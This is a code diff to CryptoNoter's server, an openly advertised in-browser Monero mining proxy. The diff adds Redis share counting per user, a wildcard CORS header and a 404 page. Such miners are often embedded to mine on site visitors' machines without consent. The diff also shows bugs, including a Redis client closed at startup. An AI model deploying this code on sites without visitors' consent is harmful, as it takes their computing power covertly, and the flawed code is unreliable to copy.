@@ -1,7 +1,7 @@
 /**
- * CryptoNoter v1.4
- * Open Source In-Browser Javascript Web Miner / Payout Towards Personal Wallet
- * THE ONLY In-Browser Web Miner That Supports Multi Cryptocurrency.
+ * CryptoNoter v1.2
+ * In-Browser Javascript XMR miner for websites / Payout towards personal XMR wallet
+ * Built for in-browser javascript mining on any Monero pools. 0% Commission. 100% Payout
  */
 var http = require('http'),
     https = require('https'),
@@ -9,6 +9,8 @@ var http = require('http'),
     net = require('net'),
     fs = require('fs'),
     crypto = require("crypto");
+    redis = require("redis");
+
 
 var banner = fs.readFileSync(__dirname + '/banner', 'utf8');
 
@@ -27,6 +29,7 @@ conf.cert = process.env.CERT || conf.cert;
 conf.pool = process.env.POOL || conf.pool;
 conf.addr = process.env.ADDR || conf.addr;
 conf.pass = process.env.PASS || conf.pass;
+conf.redis_url = process.env.REDIS_URL || conf.redis_url;
 
 if (!conf.lport) {
   console.error("Port (lport) needs to be defined in the config or via environment variable (PORT)");
@@ -51,10 +54,17 @@ if (!conf.addr) {
 //ssl support
 const ssl = !!(conf.key && conf.cert);
 
+const redisClient = redis.createClient(conf.redis_url);
+
 const stats = (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
     req.url = (req.url === '/') ? '/index.html' : req.url;
     fs.readFile(__dirname + '/web' + req.url, (err, buf) => {
-        if (err) {} else {
+        if (err) {
+            fs.readFile(__dirname + '/web/404.html', (err, buf) => {
+                res.end(buf);
+            });
+        } else {
             if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
                 buf = buf.toString().replace(/%CryptoNoter_domain%/g, conf.domain);
                 if (req.url.match(/\.js$/)) {
@@ -134,6 +144,7 @@ srv.on('connection', (ws) => {
                         },
                         "id": conn.pid
                     }
+                    redisClient.incr(conn.uid);
                     buf = JSON.stringify(buf) + '\n';
                     conn.pl.write(buf);
                     break;
@@ -245,6 +256,7 @@ srv.on('connection', (ws) => {
 });
 web.listen(conf.lport, conf.lhost, () => {
     console.log(banner);
-    console.log(' Listen on : ' + conf.lhost + ':' + conf.lport + '\n Pool Host : ' + conf.pool + '\n Wallet Add: ' + conf.addr + '\n');
+    console.log(' Listen on : ' + conf.lhost + ':' + conf.lport + '\n Pool Host : ' + conf.pool + '\n Ur Wallet : ' + conf.addr + '\n');
     console.log('----------------------------------------------------------------------------------------\n');
 });
+redisClient.quit();
